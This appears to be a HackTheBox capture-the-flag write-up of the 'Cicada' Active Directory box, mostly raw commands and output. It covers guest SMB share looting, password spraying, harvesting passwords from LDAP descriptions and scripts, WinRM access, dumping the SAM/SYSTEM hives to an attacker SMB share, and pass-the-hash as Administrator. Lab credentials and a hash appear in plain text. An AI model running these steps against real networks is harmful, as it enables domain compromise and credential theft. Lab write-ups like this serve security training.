---
title: Cicada - Active Directory
date: 2025-12-05 00:00:00 +0000
categories: [HackTheBox Writeups]
tags: [hackthebox, windows]
---

```bash
ares@legion:~/HackTheBox/Cicada$ nmap -sVC -A -T4 $target
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-10 13:01 EET
Nmap scan report for 10.129.61.174 (10.129.61.174)
Host is up (0.042s latency).
Not shown: 993 filtered tcp ports (no-response)
PORT     STATE SERVICE      VERSION
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2025-11-10 18:01:47Z)
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-11-10T18:02:37+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-11-10T18:02:37+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
3269/tcp open  ssl/ldap     Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-11-10T18:02:38+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s

TRACEROUTE (using port 5985/tcp)
HOP RTT      ADDRESS
1   41.87 ms 10.10.14.1 (10.10.14.1)
2   42.14 ms 10.129.61.174 (10.129.61.174)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 65.70 seconds
```bash

```
enum4linux-ng $target | tee enum4linuxng.log

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... 10.129.61.174
[*] Username ......... ''
[*] Random Username .. 'ajidgvzq'
[*] Password ......... ''
[*] Timeout .......... 5 second(s)

 ======================================
|    Listener Scan on 10.129.61.174    |
 ======================================
[*] Checking LDAP
[+] LDAP is accessible on 389/tcp
[*] Checking LDAPS
[+] LDAPS is accessible on 636/tcp
[*] Checking SMB
[+] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS
[+] SMB over NetBIOS is accessible on 139/tcp

 =====================================================
|    Domain Information via LDAP for 10.129.61.174    |
 =====================================================
[*] Trying LDAP
[+] Appears to be root/parent DC
[+] Long domain name is: cicada.htb

 ============================================================
|    NetBIOS Names and Workgroup/Domain for 10.129.61.174    |
 ============================================================
[-] Could not get NetBIOS names information via 'nmblookup': timed out

 ==========================================
|    SMB Dialect Check on 10.129.61.174    |
 ==========================================
[*] Trying on 445/tcp
[+] Supported dialects and settings:
Supported dialects:                                                                                     
  SMB 1.0: false                                                                                        
  SMB 2.0.2: true                                                                                       
  SMB 2.1: true                                                                                         
  SMB 3.0: true                                                                                         
  SMB 3.1.1: true                                                                                       
Preferred dialect: SMB 3.0                                                                              
SMB1 only: false                                                                                        
SMB signing required: true                                                                              

 ============================================================
|    Domain Information via SMB session for 10.129.61.174    |
 ============================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: CICADA-DC                                                                        
NetBIOS domain name: CICADA                                                                             
DNS domain: cicada.htb                                                                                  
FQDN: CICADA-DC.cicada.htb                                                                              
Derived membership: domain member                                                                       
Derived domain: CICADA                                                                                  

 ==========================================
|    RPC Session Check on 10.129.61.174    |
 ==========================================
[*] Check for anonymous access (null session)
[+] Server allows authentication via username '' and password ''
[*] Check for guest access
[+] Server allows authentication via username 'ajidgvzq' and password ''
[H] Rerunning enumeration with user 'ajidgvzq' might give more results

 ====================================================
|    Domain Information via RPC for 10.129.61.174    |
 ====================================================
[+] Domain: CICADA
[+] Domain SID: S-1-5-21-917908876-1423158569-3159038727
[+] Membership: domain member

 ================================================
|    OS Information via RPC for 10.129.61.174    |
 ================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found OS information via SMB
[*] Enumerating via 'srvinfo'
[-] Could not get OS info via 'srvinfo': STATUS_ACCESS_DENIED
[+] After merging OS information we have the following result:
OS: Windows 10, Windows Server 2019, Windows Server 2016                                                
OS version: '10.0'                                                                                      
OS release: ''                                                                                          
OS build: '20348'                                                                                       
Native OS: not supported                                                                                
Native LAN manager: not supported                                                                       
Platform id: null                                                                                       
Server type: null                                                                                       
Server type string: null                                                                                

 ======================================
|    Users via RPC on 10.129.61.174    |
 ======================================
[*] Enumerating users via 'querydispinfo'
[-] Could not find users via 'querydispinfo': STATUS_ACCESS_DENIED
[*] Enumerating users via 'enumdomusers'
[-] Could not find users via 'enumdomusers': STATUS_ACCESS_DENIED

 =======================================
|    Groups via RPC on 10.129.61.174    |
 =======================================
[*] Enumerating local groups
[-] Could not get groups via 'enumalsgroups domain': STATUS_ACCESS_DENIED
[*] Enumerating builtin groups
[-] Could not get groups via 'enumalsgroups builtin': STATUS_ACCESS_DENIED
[*] Enumerating domain groups
[-] Could not get groups via 'enumdomgroups': STATUS_ACCESS_DENIED

 =======================================
|    Shares via RPC on 10.129.61.174    |
 =======================================
[*] Enumerating shares
[+] Found 0 share(s) for user '' with password '', try a different user

 ==========================================
|    Policies via RPC for 10.129.61.174    |
 ==========================================
[*] Trying port 445/tcp
[-] SMB connection error on port 445/tcp: STATUS_ACCESS_DENIED
[*] Trying port 139/tcp
[-] SMB connection error on port 139/tcp: session failed

 ==========================================
|    Printers via RPC for 10.129.61.174    |
 ==========================================
[-] Could not get printer info via 'enumprinters': STATUS_ACCESS_DENIED

```bash
```bash
netexec smb $target -u 'guest' -p '' --shares -M spider_plus -o DOWNLOAD_FLAG=True OUTPUT_FOLDER=. EXCLUDE_FILTER='PRINT$','IPC$','SYSVOL','NETLOGON' EXCLUDE_EXTS='lnk','ini','ico'
```
![20251110131220.png](/assets/img/htb-writeups/Pasted image 20251110131220.png)
```bash
  ares@legion:~/HackTheBox/Cicada/10.129.61.174/HR$ strings Notice\ from\ HR.txt 
Dear new hire!
Welcome to Cicada Corp! We're thrilled to have you join our team. As part of our security protocols, it's essential that you change your default password to something unique and secure.
Your default password is: Cicada$M6Corpb*@Lp#nZp!8
```bash
```
  impacket-lookupsid anonymous@10.129.61.174 | tee usernames
```bash
  ![20251110133137.png](/assets/img/htb-writeups/Pasted image 20251110133137.png)
```
  crackmapexec smb $target -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8' --continue-on-success
```bash
![20251110133551.png](/assets/img/htb-writeups/Pasted image 20251110133551.png)

Enumarate AD metadata for passwords:
```
netexec ldap $target -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' -d cicada.htb --kdcHost $target --users
```bash
![20251110141128.png](/assets/img/htb-writeups/Pasted image 20251110141128.png)
```
ldapsearch -H ldap://$target -x -D "michael.wrightson@cicada.htb" -w 'Cicada$M6Corpb*@Lp#nZp!8' -b "DC=cicada,DC=htb" "(objectClass=user)" description info
```bash
 David Orelious, Users, cicada.htb
dn: CN=David Orelious,CN=Users,DC=cicada,DC=htb
description: Just in case I forget my password is aRt$Lp#7t*VQ!3

![20251110140553.png](/assets/img/htb-writeups/Pasted image 20251110140553.png)

```bash
smbclient //10.129.61.174/DEV -U 'david.orelious%aRt$Lp#7t*VQ!3' -W cicada.htb -c 'prompt OFF; recurse ON; mget *'
```
![20251110142124.png](/assets/img/htb-writeups/Pasted image 20251110142124.png)

$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
![20251110143314.png](/assets/img/htb-writeups/Pasted image 20251110143314.png)

```bash
bundle exec evil-winrm.rb -i 10.129.61.174 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'
```bash
SeBackupPrivilege
![20251110151546.png](/assets/img/htb-writeups/Pasted image 20251110151546.png)
```
reg save hklm\sam C:\Windows\Temp\sam
reg save hklm\system C:\Windows\Temp\system
```bash
Transfer files:
```bash
sudo impacket-smbserver -smb2support myshare . 
```bash
```
copy C:\Windows\Temp\sam \\10.10.14.183\myshare\
copy C:\Windows\Temp\system \\10.10.14.183\myshare\
```bash
```bash
impacket-secretsdump -sam sam -system system LOCAL 
```
![20251110152127.png](/assets/img/htb-writeups/Pasted image 20251110152127.png)

```bash
bundle exec evil-winrm.rb -i 10.129.61.174 -u Administrator -H '2b87e7c93a3e8a0ea4a581937016f341'
```bash
